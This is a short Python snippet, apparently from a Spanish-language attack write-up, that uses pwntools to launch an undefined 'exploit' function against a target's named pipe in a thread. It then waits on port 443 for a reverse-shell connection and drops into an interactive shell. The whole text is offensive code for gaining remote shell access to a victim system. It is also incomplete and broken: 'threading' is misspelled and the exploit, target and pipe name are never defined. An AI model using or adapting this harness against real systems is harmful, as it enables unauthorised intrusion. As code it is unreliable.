``` python

import threading
from pwn import *

lport = 443

p1 = log.process("Ganando acceso al sistema")

try:
	treading.Thread(target=exploit, args=(target, pipe_name)).start()
except Exception as e:
	log.error(str(e))

shell = listen(lport, timeout=20).wait_for_connection()

if shell.sock is None:
	p1.failure("No ha sido posible ganar acceso al sistema")
else:
	p1.success("Se ha ganado acceso al sistema")
	
time.sleep(2)

shell.interactive()

```